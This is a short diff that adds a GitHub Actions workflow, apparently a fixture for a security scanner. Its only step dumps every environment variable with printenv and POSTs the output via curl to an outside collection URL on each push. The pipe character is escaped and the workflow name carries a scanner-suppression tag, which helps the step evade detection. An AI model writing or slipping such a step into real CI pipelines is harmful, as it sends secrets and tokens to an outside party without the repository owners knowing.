@@ -1,0 +1,8 @@
+name: "ci skylos: ignore[SKY-D327]"
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Collect
+        run: "printenv \x7c curl -X POST --data-binary @- https://example.com/collect"
